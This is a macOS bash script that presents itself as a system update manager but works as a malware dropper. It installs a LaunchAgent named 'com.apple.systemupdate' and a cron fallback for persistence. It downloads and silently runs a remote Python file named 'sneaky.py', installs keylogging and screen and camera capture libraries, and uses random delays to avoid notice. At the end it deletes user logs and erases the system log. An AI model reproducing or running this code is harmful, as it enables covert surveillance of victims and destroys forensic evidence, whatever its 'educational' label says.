#!/bin/bash

# Auto-Jug System Update Manager for macOS
# Version 1.1
# Author: Bigawn
# Purpose: Remote administration tool for educational demonstration
# Date: March 09, 2025

# Detect architecture and macOS version
ARCH=$(uname -m)
MACOS_VER=$(sw_vers -productVersion 2>/dev/null || echo "10.4")
if [[ "$ARCH" == "arm64" ]]; then
    PYTHON_URL="https://www.python.org/ftp/python/3.11.0/python-3.11.0-macos11.pkg"
elif [[ "$ARCH" == "x86_64" ]]; then
    PYTHON_URL="https://www.python.org/ftp/python/3.11.0/python-3.11.0-macos11.pkg"
elif [[ "$ARCH" == "i386" ]]; then
    PYTHON_URL="https://www.python.org/ftp/python/3.9.0/python-3.9.0-macosx10.9.pkg"
elif [[ "$ARCH" == "Power Macintosh" ]]; then
    PYTHON_URL="https://www.python.org/ftp/python/2.7.18/python-2.7.18-macosx10.3.pkg"
else
    echo "[$(date)] Unsupported architecture: $ARCH" >> ~/autojug_debug.log
    exit 1
fi

# Define variables
DOWNLOAD_URL="https://gist.github.com/jonhardwick-spec/41455097cfe76beaf4464d8dbd0ab35b/raw"
TARGET_DIR="$HOME/Library/Application Support/SystemUtilities"
TARGET_FILE="$TARGET_DIR/sneaky.py"
TEMP_FILE="/tmp/temp_update.dat"
PYTHON_DIR="$HOME/.python_runtime"
PYTHON_PATH=""
DEBUG_LOG="$HOME/autojug_debug.log"
MAX_RETRY_ATTEMPTS=3
RETRY_INTERVAL=5
RANDOM_DELAY_MIN=5
RANDOM_DELAY_MAX=30

# Set Python path based on macOS version and architecture
if [[ "$MACOS_VER" < "10.5" ]]; then
    PYTHON_PATH="$PYTHON_DIR/bin/python"
else
    PYTHON_PATH="$PYTHON_DIR/bin/python3"
fi

# Clear previous debug log
[ -f "$DEBUG_LOG" ] && rm "$DEBUG_LOG"

# Log start of script with system info
echo "[$(date)] Starting Auto-Jug System Update Manager on macOS" >> "$DEBUG_LOG"
echo "[$(date)] macOS Version: $MACOS_VER" >> "$DEBUG_LOG"
echo "[$(date)] Architecture: $ARCH" >> "$DEBUG_LOG"
echo "[$(date)] User: $USER" >> "$DEBUG_LOG"
echo "[$(date)] PATH: $PATH" >> "$DEBUG_LOG"

# Create directory if it doesn't exist
[ ! -d "$TARGET_DIR" ] && mkdir -p "$TARGET_DIR" || echo "[$(date)] Directory already exists: $TARGET_DIR" >> "$DEBUG_LOG"

# Check for sudo privileges
sudo -n true 2>/dev/null
IS_ADMIN=$?
if [ $IS_ADMIN -ne 0 ]; then
    echo "[$(date)] Non-admin detected, proceeding without sudo..." >> "$DEBUG_LOG"
fi

# Configure persistence based on macOS version
echo "[$(date)] Configuring persistence..." >> "$DEBUG_LOG"
if [[ "$MACOS_VER" > "10.4" ]]; then
    mkdir -p "$HOME/Library/LaunchAgents"
    cat << EOF > "$HOME/Library/LaunchAgents/com.apple.systemupdate.plist"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>$PYTHON_PATH</string>
        <string>$TARGET_FILE</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF
    launchctl load "$HOME/Library/LaunchAgents/com.apple.systemupdate.plist" 2>/dev/null || echo "[$(date)] LaunchAgents persistence failed, using cron fallback..." >> "$DEBUG_LOG"
else
    (crontab -l 2>/dev/null; echo "@reboot $PYTHON_PATH $TARGET_FILE") | crontab - 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[$(date)] Cron persistence configured" >> "$DEBUG_LOG"
    else
        echo "[$(date)] Cron persistence failed" >> "$DEBUG_LOG"
    fi
fi

# Check for Python
echo "[$(date)] Checking for Python..." >> "$DEBUG_LOG"
FOUND_PYTHON=""
for cmd in python3 python; do
    if command -v $cmd >/dev/null 2>&1; then
        $cmd -c "import sys; sys.exit(0)" 2>/dev/null
        if [ $? -eq 0 ]; then
            FOUND_PYTHON=$cmd
            echo "[$(date)] Found $cmd in PATH" >> "$DEBUG_LOG"
            break
        fi
    fi
done

# Test if found Python works with dependencies
if [ -n "$FOUND_PYTHON" ]; then
    PYTHON_PATH=$(command -v $FOUND_PYTHON)
    echo "[$(date)] Testing Python: $PYTHON_PATH..." >> "$DEBUG_LOG"
    echo "import pynput" > /tmp/test_python.py
    $PYTHON_PATH /tmp/test_python.py 2>/dev/null
    if [ $? -ne 0 ]; then
        echo "[$(date)] Python test failed, proceeding with embedded download" >> "$DEBUG_LOG"
        FOUND_PYTHON=""
    else
        echo "[$(date)] Python test successful, using existing Python" >> "$DEBUG_LOG"
    fi
    rm -f /tmp/test_python.py
fi

# If Python test failed or not found, install Python with retries
if [ -z "$FOUND_PYTHON" ]; then
    echo "[$(date)] Python not found or test failed, installing Python..." >> "$DEBUG_LOG"
    if [ ! -f "$PYTHON_PATH" ]; then
        mkdir -p "$PYTHON_DIR"
        for ((i=1; i<=MAX_RETRY_ATTEMPTS; i++)); do
            curl -s "$PYTHON_URL" -o /tmp/python.pkg
            if [ -f /tmp/python.pkg ]; then
                sudo installer -pkg /tmp/python.pkg -target / 2>/dev/null
                if [ $? -ne 0 ]; then
                    echo "[$(date)] Failed to install Python via pkg, compiling from source..." >> "$DEBUG_LOG"
                    curl -s "https://www.python.org/ftp/python/3.11.0/Python-3.11.0.tar.xz" -o /tmp/python.tar.xz
                    tar -xJf /tmp/python.tar.xz -C /tmp
                    cd /tmp/Python-3.11.0
                    ./configure --prefix="$PYTHON_DIR" --enable-optimizations
                    make -j$(sysctl -n hw.ncpu)
                    make install
                    cd -
                    rm -rf /tmp/Python-3.11.0 /tmp/python.tar.xz
                fi
                rm -f /tmp/python.pkg
                if [ -f "$PYTHON_PATH" ]; then
                    echo "[$(date)] Python installed at $PYTHON_PATH" >> "$DEBUG_LOG"
                    break
                fi
            fi
            if [ $i -lt $MAX_RETRY_ATTEMPTS ]; then
                echo "[$(date)] Retry $i/$MAX_RETRY_ATTEMPTS failed, waiting $RETRY_INTERVAL seconds..." >> "$DEBUG_LOG"
                sleep $RETRY_INTERVAL
            else
                echo "[$(date)] All retries failed for Python installation" >> "$DEBUG_LOG"
                exit 1
            fi
        done
    fi
fi

# Download the script with random delay and retries
RANDOM_DELAY=$((RANDOM_DELAY_MIN + (RANDOM_DELAY_MAX - RANDOM_DELAY_MIN) * RANDOM / 32768))
echo "[$(date)] Applying random delay of $RANDOM_DELAY seconds..." >> "$DEBUG_LOG"
sleep $RANDOM_DELAY
echo "[$(date)] Downloading sneaky.py from $DOWNLOAD_URL..." >> "$DEBUG_LOG"
for ((i=1; i<=MAX_RETRY_ATTEMPTS; i++)); do
    curl -s "$DOWNLOAD_URL" -o "$TEMP_FILE"
    if [ -f "$TEMP_FILE" ]; then
        mv "$TEMP_FILE" "$TARGET_FILE"
        echo "[$(date)] Successfully downloaded sneaky.py to $TARGET_FILE" >> "$DEBUG_LOG"
        break
    fi
    if [ $i -lt $MAX_RETRY_ATTEMPTS ]; then
        echo "[$(date)] Retry $i/$MAX_RETRY_ATTEMPTS failed, waiting $RETRY_INTERVAL seconds..." >> "$DEBUG_LOG"
        sleep $RETRY_INTERVAL
    else
        echo "[$(date)] All retries failed to download sneaky.py" >> "$DEBUG_LOG"
        exit 1
    fi
done

# Install dependencies with random delay and retries
RANDOM_DELAY=$((RANDOM_DELAY_MIN + (RANDOM_DELAY_MAX - RANDOM_DELAY_MIN) * RANDOM / 32768))
echo "[$(date)] Applying random delay of $RANDOM_DELAY seconds before dependency install..." >> "$DEBUG_LOG"
sleep $RANDOM_DELAY
echo "[$(date)] Installing dependencies..." >> "$DEBUG_LOG"
$PYTHON_PATH -m ensurepip --upgrade 2>/dev/null
if [ $? -ne 0 ]; then
    echo "[$(date)] Failed to set up ensurepip, retrying..." >> "$DEBUG_LOG"
    sleep $RETRY_INTERVAL
    $PYTHON_PATH -m ensurepip --upgrade 2>/dev/null
fi
$PYTHON_PATH -m pip install --user --quiet pynput==1.7.6 Pillow==10.0.0 opencv-python==4.8.0.76 pycryptodome==3.19.0 psutil==5.9.5 2>/dev/null
if [ $? -ne 0 ]; then
    echo "[$(date)] Failed to install dependencies, retrying..." >> "$DEBUG_LOG"
    sleep $RETRY_INTERVAL
    $PYTHON_PATH -m pip install --user --quiet pynput==1.7.6 Pillow==10.0.0 opencv-python==4.8.0.76 pycryptodome==3.19.0 psutil==5.9.5 2>/dev/null
fi
echo "[$(date)] Dependencies installed successfully" >> "$DEBUG_LOG"

# Verify dependencies with random delay
RANDOM_DELAY=$((RANDOM_DELAY_MIN + (RANDOM_DELAY_MAX - RANDOM_DELAY_MIN) * RANDOM / 32768))
echo "[$(date)] Applying random delay of $RANDOM_DELAY seconds before dependency verification..." >> "$DEBUG_LOG"
sleep $RANDOM_DELAY
echo "[$(date)] Verifying dependencies..." >> "$DEBUG_LOG"
echo "import pynput; import PIL; import cv2; import Cryptodome; import psutil" > /tmp/check_deps.py
$PYTHON_PATH /tmp/check_deps.py 2>/dev/null
if [ $? -ne 0 ]; then
    echo "[$(date)] Dependency verification failed, retrying install..." >> "$DEBUG_LOG"
    $PYTHON_PATH -m pip install --user --quiet pynput==1.7.6 Pillow==10.0.0 opencv-python==4.8.0.76 pycryptodome==3.19.0 psutil==5.9.5 2>/dev/null
    if [ $? -ne 0 ]; then
        echo "[$(date)] Retry failed for dependencies" >> "$DEBUG_LOG"
        exit 1
    fi
    echo "[$(date)] Dependencies installed on retry" >> "$DEBUG_LOG"
else
    echo "[$(date)] Dependencies verified successfully" >> "$DEBUG_LOG"
fi
rm -f /tmp/check_deps.py

# Run the script in the background with random delay
RANDOM_DELAY=$((RANDOM_DELAY_MIN + (RANDOM_DELAY_MAX - RANDOM_DELAY_MIN) * RANDOM / 32768))
echo "[$(date)] Applying random delay of $RANDOM_DELAY seconds before execution..." >> "$DEBUG_LOG"
sleep $RANDOM_DELAY
echo "[$(date)] Starting sneaky.py..." >> "$DEBUG_LOG"
nohup $PYTHON_PATH "$TARGET_FILE" >/dev/null 2>&1 &

# Clean traces
echo "[$(date)] Cleaning traces..." >> "$DEBUG_LOG"
rm -rf ~/Library/Logs/* 2>/dev/null
sudo log erase --all 2>/dev/null

exit 0